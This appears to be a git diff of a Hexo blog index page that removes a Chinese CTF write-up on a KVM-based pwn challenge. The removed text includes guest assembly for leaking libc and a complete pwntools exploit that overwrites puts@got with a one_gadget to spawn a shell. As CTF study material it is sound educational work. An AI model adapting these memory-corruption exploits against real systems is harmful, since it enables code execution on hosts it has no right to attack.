-</ul>
-<p>漏洞点三：越界</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">region.slot = <span class="number">0</span>;</span><br><span class="line">region.flags = <span class="number">0</span>;</span><br><span class="line">region.guest_phys_addr = <span class="number">0LL</span>;</span><br><span class="line">region.memory_size = <span class="number">0x40000000</span>LL;            <span class="comment">// 这里肯定有溢出</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<ul>
-<li>memory_size 表示要映射的内存的大小：0x40000000 字节</li>
-<li>映射内存范围过大，导致 guest 代码能访问到宿主机的 bss 段中的其他变量 </li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.bss:<span class="number">0000000000602100</span> ??                            code_bss db    ? ;                      ; DATA XREF: pwn+<span class="number">8</span>C↑o</span><br><span class="line">    ......</span><br><span class="line">.bss:<span class="number">000000000060</span>A100 ?? ?? ?? ?? ?? ?? ?? ??       dest dq ?                               ; DATA XREF: main+<span class="number">7</span>E↑w</span><br></pre></td></tr></table></figure>
-<ul>
-<li>很明显可以通过 code_bss 访问到 dest</li>
-</ul>
-<p><strong>入侵思路</strong></p>
-<p>首先肯定要先 leak libc_base，然后通过 code_bss 的溢出来覆盖 dest（可以是 got 或者 hook）</p>
-<p>然后在以下代码中输入 one_gadget 就可以了：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kvm.name = input_line(<span class="string">&quot;host name: &quot;</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(dest, kvm.name, <span class="number">0x20</span>uLL); </span><br></pre></td></tr></table></figure>
-<p>问题的关键就是：写一段由 VCPU 运行的 code 来进行泄露</p>
-<p>先使用以下一段 code 进行测试，看看到底泄露了什么东西</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">code=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        .code16</span></span><br><span class="line"><span class="string">        lable:</span></span><br><span class="line"><span class="string">            mov al,byte ptr ds:[bx]</span></span><br><span class="line"><span class="string">            out 0,al</span></span><br><span class="line"><span class="string">            add bx,1</span></span><br><span class="line"><span class="string">            cmp bx,0x200</span></span><br><span class="line"><span class="string">            jna lable</span></span><br><span class="line"><span class="string">        hlt</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
-<ul>
-<li>利用汇编指令 <code>out</code> 把 al 寄存器中的值输出到 [标准输出]</li>
-</ul>
-<p>结果：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bbbbbbbb</span><br><span class="line">\x8a\x07�\x00\x83$</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<ul>
-<li>发现泄露的数据是从 0x603000 开始的</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x603000</span></span><br><span class="line"><span class="number">0x603000</span>:	<span class="number">0x8101c38300e6078a</span>	<span class="number">0x0000f4f3760200fb</span></span><br><span class="line"><span class="number">0x603010</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<ul>
-<li>而距离它偏移为 0x358 的地方就有前面 copy 进去的存留指针</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; distance <span class="number">0x603000</span> <span class="number">0x603358</span></span><br><span class="line"><span class="number">0x603000</span>-&gt;<span class="number">0x603358</span> is <span class="number">0x358</span> bytes (<span class="number">0x6b</span> words)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>那么进行 leak 的 code 就可以这样写：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">code=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        .code16</span></span><br><span class="line"><span class="string">        mov bx,0x8</span></span><br><span class="line"><span class="string">        mov ax,0x35</span></span><br><span class="line"><span class="string">        mov ds,ax</span></span><br><span class="line"><span class="string">        lable:</span></span><br><span class="line"><span class="string">            mov al,byte ptr ds:[bx]</span></span><br><span class="line"><span class="string">            out 0,al</span></span><br><span class="line"><span class="string">            add bx,1</span></span><br><span class="line"><span class="string">            cmp bx,0x200</span></span><br><span class="line"><span class="string">            jna lable</span></span><br><span class="line"><span class="string">        hlt</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>接下来用同样的思路覆盖 dest：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; distance <span class="number">0x603000</span> <span class="number">0x60A100</span></span><br><span class="line"><span class="number">0x603000</span>-&gt;<span class="number">0x60a100</span> is <span class="number">0x7100</span> bytes (<span class="number">0xe20</span> words)</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">code=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        .code16</span></span><br><span class="line"><span class="string">        mov bx,0x8</span></span><br><span class="line"><span class="string">        mov ax,0x35</span></span><br><span class="line"><span class="string">        mov ds,ax</span></span><br><span class="line"><span class="string">        mov ax,0x710</span></span><br><span class="line"><span class="string">        mov ss,ax</span></span><br><span class="line"><span class="string">        lable:</span></span><br><span class="line"><span class="string">            mov al,byte ptr ds:[bx]</span></span><br><span class="line"><span class="string">            out 0,al</span></span><br><span class="line"><span class="string">            add bx,1</span></span><br><span class="line"><span class="string">            cmp bx,0x200</span></span><br><span class="line"><span class="string">            jna lable</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        xor bx,bx</span></span><br><span class="line"><span class="string">        mov al,0x0B</span></span><br><span class="line"><span class="string">        mov ss:[bx+0x0],al</span></span><br><span class="line"><span class="string">        mov al,0x20</span></span><br><span class="line"><span class="string">        mov ss:[bx+0x1],al</span></span><br><span class="line"><span class="string">        mov al,0x60</span></span><br><span class="line"><span class="string">        mov ss:[bx+0x2],al</span></span><br><span class="line"><span class="string">        mov al,0</span></span><br><span class="line"><span class="string">        mov ss:[bx+0x3],al</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        hlt</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
-<ul>
-<li>把 dest 覆盖为 got 表地址附近，方便修改 put_got</li>
-</ul>
-<p>最后还有一个问题，readline() 函数会将相当一部分不可见字符转义：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x602000</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│             <span class="number">0x602000</span> —▸ <span class="number">0x601e18</span> ◂— <span class="number">0x5858585858585858</span> (<span class="string">&#x27;XXXXXXXX&#x27;</span>)</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│ rax<span class="number">-3</span> rdi<span class="number">-3</span> <span class="number">0x602008</span> ◂— <span class="number">0x6161616161136168</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│             <span class="number">0x602010</span> ◂— <span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaGb&#x27;</span></span><br><span class="line">... ↓                <span class="number">2</span> skipped</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│             <span class="number">0x602028</span> (<span class="built_in">puts</span>@got.plt) ◂— <span class="number">0x7f9eec006247</span> <span class="comment">/* &#x27;Gb&#x27; */</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>解决的办法就是：检查 one_gadget 的每一字节，如果是不可见字符则重启程序</li>
-</ul>
-<p>完整 exp：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    flag=<span class="number">0</span></span><br><span class="line">    p=process(<span class="string">&#x27;./mykvm&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    code=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            .code16</span></span><br><span class="line"><span class="string">            mov bx,0x8</span></span><br><span class="line"><span class="string">            mov ax,0x35</span></span><br><span class="line"><span class="string">            mov ds,ax</span></span><br><span class="line"><span class="string">            mov ax,0x710</span></span><br><span class="line"><span class="string">            mov ss,ax</span></span><br><span class="line"><span class="string">            lable:</span></span><br><span class="line"><span class="string">                mov al,byte ptr ds:[bx]</span></span><br><span class="line"><span class="string">                out 0,al</span></span><br><span class="line"><span class="string">                add bx,1</span></span><br><span class="line"><span class="string">                cmp bx,0x200</span></span><br><span class="line"><span class="string">                jna lable</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">            xor bx,bx</span></span><br><span class="line"><span class="string">            mov al,0x0B</span></span><br><span class="line"><span class="string">            mov ss:[bx+0x0],al</span></span><br><span class="line"><span class="string">            mov al,0x20</span></span><br><span class="line"><span class="string">            mov ss:[bx+0x1],al</span></span><br><span class="line"><span class="string">            mov al,0x60</span></span><br><span class="line"><span class="string">            mov ss:[bx+0x2],al</span></span><br><span class="line"><span class="string">            mov al,0</span></span><br><span class="line"><span class="string">            mov ss:[bx+0x3],al</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">            hlt</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(r,&quot;b*0x400E64&quot;)</span></span><br><span class="line"></span><br><span class="line">    size = <span class="number">0x1000</span></span><br><span class="line">    name = <span class="string">&quot;a&quot;</span>*<span class="number">0x8</span></span><br><span class="line">    passwd = <span class="string">&quot;b&quot;</span>*<span class="number">0x8</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;your code size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;your code:&quot;</span>,code)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;guest name:&quot;</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;guest passwd:&quot;</span>,passwd)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&quot;b&quot;</span>*<span class="number">0x8</span>+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    leak_addr=u64(p.recv(<span class="number">8</span>))</span><br><span class="line">    libc_base=leak_addr-<span class="number">0x3d1198</span></span><br><span class="line">    success(<span class="string">&quot;leak_addr: &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">    success(<span class="string">&quot;libc_base: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    one_gadget=libc_base+<span class="number">0xf1247</span></span><br><span class="line"></span><br><span class="line">    test=one_gadget</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">3</span>):</span><br><span class="line">        char=test%<span class="number">0x100</span></span><br><span class="line">        <span class="keyword">if</span> (char&gt;<span class="number">0x7e</span> <span class="keyword">or</span> char&lt;<span class="number">0x20</span> ):</span><br><span class="line">            flag=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        test=test//<span class="number">0x100</span></span><br><span class="line">    <span class="keyword">if</span> (flag==<span class="number">1</span>):</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&quot;host name: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;a&quot;</span>*<span class="number">0x1D</span>+p64(one_gadget))</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>
-<hr>
-<p><strong>小结：</strong></p>
-<p>这个题目搭环境花了好长时间，本地打通以后打不通远程，用 gdbserver 调试了一下才发现 heap 环境不一样</p>
-<p>学到了不少东西：</p>
-<ul>
-<li>gdbserver 调试 docker 中的环境</li>
-<li>KVM api</li>
-<li>一些汇编的知识</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -2325,7 +2102,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">218</span>
+          <span class="site-state-item-count">219</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -2379,7 +2156,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="Reading time total">43:49</span>
+    <span title="Reading time total">44:02</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
   </div>
